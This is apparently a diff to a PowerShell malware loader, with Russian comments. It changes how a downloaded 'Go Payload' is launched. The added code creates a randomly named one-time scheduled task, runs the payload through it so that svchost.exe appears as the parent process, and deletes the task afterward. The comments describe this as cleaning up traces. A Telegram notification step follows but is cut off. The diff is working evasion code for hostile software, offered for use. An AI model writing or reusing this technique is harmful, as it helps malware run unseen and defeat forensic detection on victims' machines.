@@ -59,18 +59,19 @@ try {
 }
 
 if (Test-Path $outPath) {
-    Write-Host "[+] Executing Go Payload with Independent Console Context..."
+    Write-Host "[+] Detaching from PowerShell via Scheduled Task..."
     
-    # 0x08000000 = CREATE_NO_WINDOW (Создает чистый процесс без отнаследованных хэндлов)
-    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
-    $pinfo.FileName = $outPath
-    $pinfo.WorkingDirectory = $targetDir
-    $pinfo.UseShellExecute = $false
-    $pinfo.CreateNoWindow = $true
+    $taskName = -join ((65..90) | Get-Random -Count 6 | ForEach-Object {[char]$_})
     
-    $p = New-Object System.Diagnostics.Process
-    $p.StartInfo = $pinfo
-    $null = $p.Start()
+    # 1. Создаем одноразовую задачу от имени текущего пользователя
+    schtasks /create /tn $taskName /tr "`"$outPath`"" /sc ONCE /st 00:00 /f | Out-Null
+    
+    # 2. Мгновенно запускаем ее (родителем станет svchost.exe)
+    schtasks /run /tn $taskName | Out-Null
+    
+    # 3. Чистим за собой следы (удаляем задачу из списка)
+    Start-Sleep -Seconds 2
+    schtasks /delete /tn $taskName /f | Out-Null
 }
 # Telegram Notification
 try {
